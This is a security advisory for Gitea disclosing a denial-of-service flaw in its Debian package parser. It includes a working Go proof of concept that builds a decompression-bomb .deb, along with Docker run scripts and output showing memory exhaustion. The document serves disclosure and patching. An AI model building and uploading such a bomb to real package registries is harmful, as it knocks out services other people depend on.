# [H] Gitea: Denial of Service (CPU & Memory Exhaustion) via O(N^2) String Concatenation in Debian Package Upload

## Summary
Severity: High
Advisory: GHSA-6hm7-3pwj-22rm
CVE: CVE-2026-56755
CWE: CWE-409
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-07-21
Source: https://github.com/advisories/GHSA-6hm7-3pwj-22rm
Type: github-advisory

## Affected
- Go: `code.gitea.io/gitea` — affected >=0 <1.27.0

## Details
Gitea's Debian package registry parser contains an unbounded decompression vulnerability in [ParseControlFile](https://github.com/go-gitea/gitea/blob/689ace1ce28fd74244b8aa335d9928cdbf6b22f9/modules/packages/debian/metadata.go#L140). When processing an uploaded `.deb` file, the parser decompresses `control.tar.gz` and copies the entire uncompressed stream into a `strings.Builder` via a `TeeReader`, with no limit on how much data is read. Because `DEFLATE` compression can achieve ratios exceeding 100:1 on repetitive input, an attacker can craft an 83 MB `.deb` payload that expands to over 16 GB during parsing, exhausting server memory before any content validation runs. A second issue compounds this: continuation lines in the Description field are concatenated with `+=` at [modules/packages/debian/metadata.go:161](https://github.com/go-gitea/gitea/blob/689ace1ce28fd74244b8aa335d9928cdbf6b22f9/modules/packages/debian/metadata.go#L161) inside a loop, producing `O(N²)` allocation and copy work that stalls the CPU even at moderate line counts. Any authenticated user with write access to the package registry can trigger a complete denial of service with a single upload request to the handler at [routers/api/packages/debian/debian.go:146](https://github.com/go-gitea/gitea/blob/689ace1ce28fd74244b8aa335d9928cdbf6b22f9/routers/api/packages/debian/debian.go#L146).

### Root Cause

There are two distinct root causes that can be exploited independently or together.

**1. Unbounded decompression (decompression bomb)**
ParsePackage wraps the control.tar member in a decompressor but never constrains how many bytes that decompressor is allowed to produce:

https://github.com/go-gitea/gitea/blob/9155a81b9daf1d46b2380aa91271e623ac947c1e/modules/packages/debian/metadata.go#L88-L110

The resulting inner reader is passed directly to the tar reader, and from there to `ParseControlFile`. Inside `ParseControlFile`,
every byte that the `bufio.Scanner` reads from the decompressed stream is simultaneously written into an unbounded
`strings.Builder` via `io.TeeReader`:

https://github.com/go-gitea/gitea/blob/9155a81b9daf1d46b2380aa91271e623ac947c1e/modules/packages/debian/metadata.go#L147-L150

There is no call to io.LimitReader at any point in this chain. Other package format parsers in the same codebase — pub, conan, and cargo — all wrap their readers with `io.LimitReader` before consuming them. The Debian parser does not, making it the only one in the registry vulnerable to this class of attack.

**2. O(N²) string concatenation**
For each continuation line belonging to the Description field, the parser appends to a plain string with +=:

https://github.com/go-gitea/gitea/blob/9155a81b9daf1d46b2380aa91271e623ac947c1e/modules/packages/debian/metadata.go#L158-L164

Because Go strings are immutable, every `+=` allocates a new backing array and copies the entire accumulated description into it. A description with N continuation lines triggers O(N²) total bytes of allocation and copying. At 500 000 lines this produces roughly 250 GB of cumulative copy work, saturating a CPU core and driving the GC into a tight collection loop regardless of available RAM.

### Reproducing
I have reproduced the issue in a Docker container with the following PoC. It may need tweaks based on the memory you are reproducing it with. 

This has been reproduced on commit `9155a81b9daf1d46b2380aa91271e623ac947c1e`.

All the files go in the gitea file directory. 

`cmd/poc/main.go`
```go
package main

import (
	"archive/tar"
	"bytes"
	"compress/gzip"
	"fmt"
	"io"
	"os"
	"runtime"
	"strings"
	"time"

	"github.com/blakesmith/ar"

	debian_module "gitea.dev/modules/packages/debian"
)

// targetUncompressed is the desired size of the uncompressed control file.
// Set comfortably above the 12 GB container limit so the OOM kill is reliable.
const targetUncompressed = 15 * 1024 * 1024 * 1024 // 15 GB

// padLine is the filler field written after the required package fields.
// Using an unknown field key ("X") means the parser discards the value but the
// TeeReader still copies every byte into control.Builder — that is the bug.
// Unlike Description continuation lines this does NOT trigger the O(N²) path,
// so memory exhaustion is purely linear and fast.
const padLine = "X: a\n" // 5 bytes

// controlHeader is a minimal valid Debian control file preamble.
const controlHeader = "Package: evil\n" +
	"Version: 1.0\n" +
	"Architecture: amd64\n" +
	"Maintainer: Evil Hacker <evil@evil.com>\n" +
	"Description: exploit\n"

func printMem() {
	var m runtime.MemStats
	runtime.ReadMemStats(&m)
	// Print RSS-equivalent (HeapSys + StackSys covers most process memory).
	fmt.Printf("[mem] HeapAlloc=%.2f GB  Sys=%.2f GB  TotalAlloc=%.2f GB\n",
		float64(m.HeapAlloc)/1e9,
		float64(m.Sys)/1e9,
		float64(m.TotalAlloc)/1e9,
	)
}

// buildControlTarGz streams a gzip-compressed tar archive containing a single
// "control" entry whose uncompressed size is ~targetUncompressed bytes.
// Writing is done in large batches so the loop itself is fast; gzip compresses
// the repetitive content to a fraction of its original size.
func buildControlTarGz(w io.Writer) error {
	gzw, err := gzip.NewWriterLevel(w, gzip.BestSpeed)
	if err != nil {
		return fmt.Errorf("gzip.NewWriter: %w", err)
	}
	tw := tar.NewWriter(gzw)

	numPadLines := (targetUncompressed - len(controlHeader)) / len(padLine)
	totalSize := int64(len(controlHeader)) + int64(numPadLines)*int64(len(padLine))

	if err := tw.WriteHeader(&tar.Header{
		Name:     "./control",
		Mode:     0o644,
		Size:     totalSize,
		ModTime:  time.Now(),
		Typeflag: tar.TypeReg,
	}); err != nil {
		return fmt.Errorf("tar WriteHeader: %w", err)
	}
	if _, err := tw.Write([]byte(controlHeader)); err != nil {
		return fmt.Errorf("write header: %w", err)
	}

	// Write padLine in 5 MB batches (1 M lines × 5 bytes).
	const batchLines = 1_000_000
	batch := []byte(strings.Repeat(padLine, batchLines))
	fullBatches := numPadLines / batchLines
	remainder := numPadLines % batchLines

	fmt.Printf("  Streaming %d lines (%.1f GB) through gzip...\n",
		numPadLines, float64(totalSize)/1e9)

	t0 := time.Now()
	for i := range fullBatches {
		if _, err := tw.Write(batch); err != nil {
			return fmt.Errorf("batch write: %w", err)
		}
		if i%500 == 0 && i > 0 {
			pct := float64(i) / float64(fullBatches) * 100
			fmt.Printf("  ... %.0f%% (%.1fs)\n", pct, time.Since(t0).Seconds())
		}
	}
	if remainder > 0 {
		if _, err := tw.Write(batch[:remainder*len(padLine)]); err != nil {
			return fmt.Errorf("remainder write: %w", err)
		}
	}

	if err := tw.Close(); err != nil {
		return fmt.Errorf("tar close: %w", err)
	}
	if err := gzw.Close(); err != nil {
		return fmt.Errorf("gzip close: %w", err)
	}
	fmt.Printf("  Done in %.1fs\n", time.Since(t0).Seconds())
	return nil
}

// buildDeb writes a complete .deb (ar archive) to w.  The control.tar.gz member
// is the bomb; data.tar.gz is empty.
func buildDeb(w io.Writer) error {
	// Buffer control.tar.gz first so we know its compressed size for the ar header.
	var ctrlBuf bytes.Buffer
	fmt.Println("[phase 1] Generating control.tar.gz (compressed payload)...")
	if err := buildControlTarGz(&ctrlBuf); err != nil {
		return err
	}
	ctrlBytes := ctrlBuf.Bytes()
	fmt.Printf("  control.tar.gz compressed size: %.2f MB\n", float64(len(ctrlBytes))/1e6)

	// Empty data.tar.gz
	var dataBuf bytes.Buffer
	dgzw, _ := gzip.NewWriterLevel(&dataBuf, gzip.BestSpeed)
	tar.NewWriter(dgzw).Close()
	dgzw.Close()
	dataBytes := dataBuf.Bytes()

	arw := ar.NewWriter(w)
	if err := arw.WriteGlobalHeader(); err != nil {
		return err
	}
	now := time.Now()

	for _, member := range []struct {
		name string
		data []byte
	}{
		{"debian-binary", []byte("2.0\n")},
		{"control.tar.gz", ctrlBytes},
		{"data.tar.gz", dataBytes},
	} {
		if err := arw.WriteHeader(&ar.Header{
			Name:    member.name,
			Size:    int64(len(member.data)),
			Mode:    0o644,
			ModTime: now,
		}); err != nil {
			return fmt.Errorf("ar header %s: %w", member.name, err)
		}
		if _, err := arw.Write(member.data); err != nil {
			return fmt.Errorf("ar write %s: %w", member.name, err)
		}
	}
	return nil
}

func main() {
	fmt.Println("=== Gitea Debian Parser — Decompression Bomb PoC ===")
	fmt.Printf("Target uncompressed control file size: %.1f GB\n", float64(targetUncompressed)/1e9)
	fmt.Printf("Container memory limit: 12 GB\n\n")

	// Background goroutine prints memory stats every 2 s.
	go func() {
		for range time.Tick(2 * time.Second) {
			printMem()
		}
	}()

	// Phase 1 — create the payload and save it to a temp file.
	// Writing to disk keeps the ~200 MB compressed payload out of the heap
	// before we start the parse phase.
	tmp, err := os.CreateTemp("", "evil-*.deb")
	if err != nil {
		fmt.Fprintf(os.Stderr, "CreateTemp: %v\n", err)
		os.Exit(1)
	}
	defer os.Remove(tmp.Name())
	defer tmp.Close()

	t0 := time.Now()
	if err := buildDeb(tmp); err != nil {
		fmt.Fprintf(os.Stderr, "buildDeb: %v\n", err)
		os.Exit(1)
	}
	sz, _ := tmp.Seek(0, io.SeekCurrent)
	fmt.Printf("\nPayload .deb on disk: %.2f MB  (took %.1fs)\n\n", float64(sz)/1e6, time.Since(t0).Seconds())

	// Phase 2 — call ParsePackage, mirroring UploadPackageFile at
	// routers/api/packages/debian/debian.go:146.
	// The TeeReader inside ParseControlFile (metadata.go:149) will copy the
	// entire 15 GB decompressed stream into control.Builder, exhausting the
	// 12 GB container limit and triggering an OOM kill.
	fmt.Println("[phase 2] Calling debian_module.ParsePackage (same call as the HTTP handler)...")
	fmt.Println("          Memory will grow until the container is OOM-killed.")
	printMem()

	if _, err := tmp.Seek(0, io.SeekStart); err != nil {
		fmt.Fprintf(os.Stderr, "seek: %v\n", err)
		os.Exit(1)
	}

	t1 := time.Now()
	_, parseErr := debian_module.ParsePackage(tmp)
	// We only reach here if ParsePackage returns before OOM (e.g. scanner error).
	fmt.Printf("\nParsePackage returned after %.1fs: %v\n", time.Since(t1).Seconds(), parseErr)
	printMem()
}
```

`Dockerfile.poc`
```docker
FROM golang:1.26-bookworm AS builder

WORKDIR /src
# Copy the full repo so the PoC can import gitea.dev/modules/packages/debian
# and github.com/blakesmith/ar via the existing go.mod/go.sum.
COPY . .

# Build only the PoC binary; ignore the rest of the tree.
RUN go build -o /poc ./cmd/poc/

# ── runtime image ──────────────────────────────────────────────────────────────
FROM debian:bookworm-slim
COPY --from=builder /poc /poc
ENTRYPOINT ["/poc"]
```

Now run the PoC in the Docker container with:

```bash
#!/usr/bin/env bash
set -euo pipefail

IMAGE=gitea-debian-poc

echo "=== Building Docker image ==="
docker build -f Dockerfile.poc -t "$IMAGE" .

echo ""
echo "=== Running PoC (memory limit: 12 GB) ==="
echo "    The container will be OOM-killed once memory is exhausted."
echo ""

# --memory caps RSS; --memory-swap equal to --memory disables swap.
# --oom-kill-disable is NOT set so the kernel OOM killer fires normally.
docker run --rm \
  --memory=12g \
  --memory-swap=12g \
  --name gitea-poc \
  "$IMAGE"

EXIT=$?
echo ""
if [ $EXIT -eq 137 ]; then
  echo "Container exited with code 137 (SIGKILL from OOM killer) — vulnerability confirmed."
else
  echo "Container exited with code $EXIT."
fi
```

You will see the following when running the container (see the heap allocation growing towards the end):

```
=== Building Docker image ===
DEPRECATED: The legacy builder is deprecated and will be removed in a future release.
            Install the buildx component to build images with BuildKit:
            https://docs.docker.com/go/buildx/

Sending build context to Docker daemon  59.32MB
Step 1/7 : FROM golang:1.26-bookworm AS builder
 ---> eafdda676c2e
Step 2/7 : WORKDIR /src
 ---> Using cache
 ---> db52a8f73485
Step 3/7 : COPY . .
 ---> Using cache
 ---> 4caf57c6e889
Step 4/7 : RUN go build -o /poc ./cmd/poc/
 ---> Using cache
 ---> 286afcb05d0e
Step 5/7 : FROM debian:bookworm-slim
 ---> f54f5c8e2e12
Step 6/7 : COPY --from=builder /poc /poc
 ---> Using cache
 ---> d7d0b269df49
Step 7/7 : ENTRYPOINT ["/poc"]
 ---> Using cache
 ---> b233faaad561
Successfully built b233faaad561
Successfully tagged gitea-debian-poc:latest

=== Running PoC (memory limit: 12 GB) ===
    The container will be OOM-killed once memory is exhausted.

=== Gitea Debian Parser — Decompression Bomb PoC ===
Target uncompressed control file size: 16.1 GB
Container memory limit: 12 GB

[phase 1] Generating control.tar.gz (compressed payload)...
  Streaming 3221225450 lines (16.1 GB) through gzip...
[mem] HeapAlloc=0.04 GB  Sys=0.08 GB  TotalAlloc=0.05 GB
  ... 16% (2.1s)
  ... 31% (3.9s)
[mem] HeapAlloc=0.07 GB  Sys=0.11 GB  TotalAlloc=0.08 GB
  ... 47% (5.8s)
[mem] HeapAlloc=0.11 GB  Sys=0.18 GB  TotalAlloc=0.15 GB
  ... 62% (7.4s)
[mem] HeapAlloc=0.11 GB  Sys=0.18 GB  TotalAlloc=0.15 GB
  ... 78% (9.0s)
[mem] HeapAlloc=0.21 GB  Sys=0.31 GB  TotalAlloc=0.29 GB
  ... 93% (10.8s)
  Done in 11.5s
  control.tar.gz compressed size: 83.07 MB

Payload .deb on disk: 83.07 MB  (took 11.6s)

[phase 2] Calling debian_module.ParsePackage (same call as the HTTP handler)...
          Memory will grow until the container is OOM-killed.
[mem] HeapAlloc=0.21 GB  Sys=0.31 GB  TotalAlloc=0.29 GB
[mem] HeapAlloc=0.41 GB  Sys=0.44 GB  TotalAlloc=0.48 GB
[mem] HeapAlloc=0.25 GB  Sys=0.61 GB  TotalAlloc=1.63 GB
[mem] HeapAlloc=0.63 GB  Sys=0.97 GB  TotalAlloc=2.63 GB
[mem] HeapAlloc=0.83 GB  Sys=1.52 GB  TotalAlloc=3.80 GB
[mem] HeapAlloc=1.39 GB  Sys=2.00 GB  TotalAlloc=5.34 GB
[mem] HeapAlloc=1.37 GB  Sys=2.00 GB  TotalAlloc=5.86 GB
[mem] HeapAlloc=1.42 GB  Sys=2.60 GB  TotalAlloc=6.97 GB
[mem] HeapAlloc=1.40 GB  Sys=3.35 GB  TotalAlloc=8.26 GB
[mem] HeapAlloc=2.25 GB  Sys=3.36 GB  TotalAlloc=9.11 GB
[mem] HeapAlloc=1.97 GB  Sys=4.28 GB  TotalAlloc=10.48 GB
[mem] HeapAlloc=2.73 GB  Sys=4.29 GB  TotalAlloc=11.23 GB
[mem] HeapAlloc=2.77 GB  Sys=5.45 GB  TotalAlloc=12.67 GB
[mem] HeapAlloc=2.90 GB  Sys=5.45 GB  TotalAlloc=13.46 GB
[mem] HeapAlloc=3.57 GB  Sys=5.46 GB  TotalAlloc=14.13 GB
[mem] HeapAlloc=2.94 GB  Sys=5.46 GB  TotalAlloc=16.07 GB
[mem] HeapAlloc=3.72 GB  Sys=5.47 GB  TotalAlloc=16.85 GB
[mem] HeapAlloc=4.50 GB  Sys=5.48 GB  TotalAlloc=17.64 GB
[mem] HeapAlloc=5.30 GB  Sys=7.28 GB  TotalAlloc=19.58 GB
[mem] HeapAlloc=3.82 GB  Sys=7.28 GB  TotalAlloc=20.17 GB
[mem] HeapAlloc=4.66 GB  Sys=7.29 GB  TotalAlloc=21.01 GB
[mem] HeapAlloc=5.33 GB  Sys=7.29 GB  TotalAlloc=21.67 GB
[mem] HeapAlloc=6.62 GB  Sys=9.56 GB  TotalAlloc=24.40 GB
[mem] HeapAlloc=6.62 GB  Sys=9.56 GB  TotalAlloc=24.40 GB
[mem] HeapAlloc=4.72 GB  Sys=9.56 GB  TotalAlloc=25.09 GB
[mem] HeapAlloc=5.54 GB  Sys=9.56 GB  TotalAlloc=25.90 GB
[mem] HeapAlloc=6.28 GB  Sys=9.57 GB  TotalAlloc=26.64 GB
[mem] HeapAlloc=7.15 GB  Sys=9.59 GB  TotalAlloc=27.51 GB
[mem] HeapAlloc=8.27 GB  Sys=12.40 GB  TotalAlloc=30.43 GB
[mem] HeapAlloc=5.52 GB  Sys=12.40 GB  TotalAlloc=30.90 GB
[mem] HeapAlloc=6.35 GB  Sys=12.40 GB  TotalAlloc=31.74 GB
[mem] HeapAlloc=7.18 GB  Sys=12.40 GB  TotalAlloc=32.57 GB
[mem] HeapAlloc=8.01 GB  Sys=12.41 GB  TotalAlloc=33.39 GB
[mem] HeapAlloc=8.80 GB  Sys=12.43 GB  TotalAlloc=34.19 GB
```

## References
- https://github.com/go-gitea/gitea/security/advisories/GHSA-6hm7-3pwj-22rm
- https://github.com/go-gitea/gitea/pull/38406
- https://github.com/go-gitea/gitea/pull/38426
- https://github.com/go-gitea/gitea/commit/de4b8277e9cb576f2315fb03b5ab6478b42a1d31
- https://github.com/go-gitea/gitea/commit/f69e15afe7496cc62e96dab244629c69eb31a7bf
- https://github.com/go-gitea/gitea
- https://github.com/go-gitea/gitea/releases/tag/v1.27.0
